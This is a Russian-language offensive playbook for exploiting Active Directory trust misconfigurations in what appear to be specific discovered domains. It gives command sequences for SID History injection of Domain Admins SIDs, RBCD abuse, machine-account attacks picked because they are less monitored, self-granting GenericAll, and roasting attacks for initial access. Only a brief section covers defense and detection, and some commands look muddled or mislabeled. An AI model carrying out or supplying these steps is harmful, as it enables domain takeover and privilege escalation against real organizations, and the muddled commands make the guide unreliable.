# Эксплуатация мисконфигов межтрастовых отношений

## ⚠️ ВАЖНО: Требования к правам

**Мисконфиги трастов - это возможность, но не автоматическая уязвимость!**

Для эксплуатации мисконфигов трастов все равно нужны определенные права:
- **SID History атака** - требует Domain Admins или права на модификацию `sIDHistory`
- **TGT Delegation** - требует права на настройку RBCD или контроль над компьютером
- **Межлесная эскалация** - требует права на модификацию объектов

**НО:** Есть вещи, которые можно делать с минимальными правами (см. раздел "Разведка без привилегий")

---

## Найденные мисконфиги

1. **trusted.domain.local** - SID Filtering DISABLED, TGT Delegation Enabled
2. **int.example.local** - SID Filtering DISABLED, TGT Delegation Enabled  
3. **test.example.local** - SID Filtering DISABLED, TGT Delegation Enabled

---

## Вектор 1: SID History Attack (CRITICAL)

### Что это?
Когда SID Filtering отключен, можно добавить SID из доверенного домена к своей УЗ или машинной УЗ, получив привилегии из того домена.

### Требования:
- SID Filtering отключен на трасте ✅
- Права на модификацию `sIDHistory` атрибута
- Знание SID целевой группы в доверенном домене

### Как использовать:

#### 1. Добавить SID Domain Admins из доверенного домена:
```bash
# К своей УЗ
add_sid_history john.doe "trusted.domain.local" "Domain Admins"

# К машинной УЗ
add_sid_history COMPUTER01$ "trusted.domain.local" "Domain Admins"
```

#### 2. Добавить конкретный SID:
```bash
add_sid_history john.doe "trusted.domain.local" "S-1-5-21-1234567890-123456789-123456789-512"
```

#### 3. Проверить результат:
```bash
# Проверить свои привилегии
get_privileges john.doe

# Проверить группы
get_user_groups john.doe
```

### Что дальше?
1. **Переаутентифицироваться** - получить новый Kerberos TGT с новым SID
2. **Использовать привилегии** - теперь у тебя есть права из доверенного домена
3. **Эскалировать в доверенном домене** - если добавил Domain Admins SID

### Ограничения:
- Нужны права на модификацию `sIDHistory` (обычно только у Domain Admins)
- Если нет прав - используй `dacl_modify` чтобы дать себе права:
  ```bash
  dacl_modify john.doe john.doe add GenericAll
  ```

---

## Вектор 2: Kerberos Delegation Attack (RISKY)

### Что это?
TGT Delegation позволяет делать Kerberos delegation атаки через межлесные трасты.

### Требования:
- TGT Delegation включен ✅
- Контроль над компьютером в доверенном домене
- Или контроль над сервисом с SPN

### Как использовать:

#### 1. Найти компьютеры в доверенном домене:
```bash
# Поиск через траст (если есть доступ)
search "(objectClass=computer)" sAMAccountName,servicePrincipalName
```

#### 2. Настроить RBCD на компьютер в доверенном домене:
```bash
# Если есть права на модификацию msDS-AllowedToActOnBehalfOfOtherIdentity
set_rbcd "COMPUTER01.trusted.domain.local" "CN=COMPUTER02,CN=Computers,DC=domain,DC=local"
```

#### 3. Использовать для перехода между доменами:
- Аутентифицироваться от имени пользователя из доверенного домена
- Получить доступ к ресурсам в доверенном домене

---

## Вектор 3: Межлесная эскалация привилегий

### Сценарий:
1. У тебя есть права в домене `domain.local`
2. Траст с `trusted.domain.local` имеет SID Filtering отключен
3. Можно добавить SID Domain Admins из `trusted.domain.local`
4. Получить полный контроль над `trusted.domain.local`

### Пошаговый план:

#### Шаг 1: Проверить свои права
```bash
# Проверить, можешь ли модифицировать sIDHistory
check_permissions john.doe

# Или проверить права на себя
check_permissions -find-writable-groups -limit 50
```

#### Шаг 2: Если нет прав - получить их
```bash
# Дать себе GenericAll на свою УЗ
dacl_modify john.doe john.doe add GenericAll

# Или добавить себя в группу с правами
set_privilege john.doe SeDebugPrivilege add stealth
```

#### Шаг 3: Добавить SID History
```bash
# Добавить Domain Admins SID из доверенного домена
add_sid_history john.doe "trusted.domain.local" "Domain Admins"
```

#### Шаг 4: Переаутентифицироваться
```bash
# Выйти и зайти заново, или использовать kinit
# Kerberos TGT будет содержать новый SID
```

#### Шаг 5: Использовать привилегии
```bash
# Теперь у тебя есть права Domain Admins в trusted.domain.local
# Можно делать что угодно в том домене
```

---

## Вектор 4: Атака через машинные УЗ

### Преимущества машинных УЗ:
- Меньше мониторинга
- Часто имеют больше прав
- Можно использовать для persistence

### Как использовать:

#### 1. Найти машинную УЗ с правами:
```bash
# Найти компьютеры
search "(objectClass=computer)" sAMAccountName

# Проверить привилегии компьютера
get_privileges COMPUTER01$
```

#### 2. Добавить SID History к машинной УЗ:
```bash
add_sid_history COMPUTER01$ "trusted.domain.local" "Domain Admins"
```

#### 3. Использовать машинную УЗ для доступа:
- Аутентифицироваться как COMPUTER01$
- Использовать привилегии из доверенного домена

---

## Практические примеры

### Пример 1: Быстрая эскалация
```bash
# 1. Проверить трасты
get_trusts -misconfig

# 2. Проверить свои права
check_permissions john.doe

# 3. Если нужно - дать себе права
dacl_modify john.doe john.doe add GenericAll

# 4. Добавить SID History
add_sid_history john.doe "trusted.domain.local" "Domain Admins"

# 5. Переаутентифицироваться и использовать
```

### Пример 2: Через машинную УЗ
```bash
# 1. Найти компьютер
search "(sAMAccountName=COMPUTER01$)" distinguishedName

# 2. Проверить права на него
check_permissions "COMPUTER01$"

# 3. Добавить SID History
add_sid_history COMPUTER01$ "trusted.domain.local" "Domain Admins"

# 4. Использовать машинную УЗ
```

---

## Защита и обнаружение

### Что мониторить:
- Изменения в `sIDHistory` атрибуте
- Необычные аутентификации из доверенных доменов
- Попытки модификации трастов

### Как защититься:
1. **Включить SID Filtering** на всех трастах
2. **Отключить TGT Delegation** если не нужно
3. **Мониторить изменения** в sIDHistory
4. **Ограничить права** на модификацию sIDHistory

---

## Полезные команды

```bash
# Проверить трасты
get_trusts
get_trusts -misconfig

# Проверить свои права
check_permissions john.doe
check_permissions -find-writable-groups

# Добавить SID History
add_sid_history <target> <trusted_domain> <group_or_sid>

# Проверить привилегии
get_privileges john.doe

# Дать себе права
dacl_modify john.doe john.doe add GenericAll
```

---

## Что можно сделать БЕЗ привилегий

### ⚠️ Важно понимать:

**Мисконфиги трастов - это возможность, но не автоматическая уязвимость!**

Для прямой эксплуатации (SID History атака) нужны права Domain Admins. **НО** есть вещи, которые можно делать с минимальными правами:

### 1. Разведка в доверенном домене

Если траст bidirectional или inbound, можно перечислять объекты:

```bash
# Поиск пользователей
search "(objectClass=user)" sAMAccountName,distinguishedName

# Поиск компьютеров
search "(objectClass=computer)" sAMAccountName,servicePrincipalName

# Поиск групп
search "(objectClass=group)" sAMAccountName,distinguishedName
```

### 2. Поиск уязвимостей в доверенном домене

```bash
# AS-REP Roasting (пользователи без pre-auth)
get_asreproast

# Поиск привилегированных аккаунтов
search "(adminCount=1)" sAMAccountName,distinguishedName

# Поиск компьютеров с RBCD
# (нужно искать msDS-AllowedToActOnBehalfOfOtherIdentity)
```

### 3. Анализ трастов для дальнейшей эксплуатации

```bash
# Получить полную информацию
get_trusts

# Найти все мисконфиги
get_trusts -misconfig
```

### 4. Стратегия без привилегий:

1. **Разведка** - собрать максимум информации о доверенном домене
2. **Поиск уязвимостей** - AS-REP Roasting, Kerberoasting, слабые пароли
3. **Поиск векторов эскалации** - объекты с GenericAll, WriteDacl
4. **Компрометация через другие векторы** - использовать найденные уязвимости
5. **Затем использовать мисконфиги трастов** - после получения прав использовать SID History

### Что НЕЛЬЗЯ сделать без привилегий:

❌ Модифицировать sIDHistory - нужны Domain Admins права  
❌ Настраивать RBCD - нужны права на модификацию  
❌ Добавлять себя в группы - нужны права на модификацию  
❌ Создавать новые объекты - нужны права на создание  

### Вывод:

**Мисконфиги трастов - это "ключ", но нужен "замок" (права) для его использования.**

Сначала нужно получить права через другие векторы (AS-REP Roasting, Kerberoasting, слабые пароли, GenericAll на объектах), а затем использовать мисконфиги трастов для межлесной эскалации.

---

## Важные замечания

⚠️ **SID History атака требует прав Domain Admins** для модификации `sIDHistory`

⚠️ **После добавления SID нужно переаутентифицироваться** - новый Kerberos TGT будет содержать SID

⚠️ **SID Filtering должен быть отключен** - иначе SID будет отфильтрован

⚠️ **Это очень шумная атака** - изменения в sIDHistory логируются

⚠️ **Мисконфиги трастов - это возможность, но нужны права для эксплуатации**

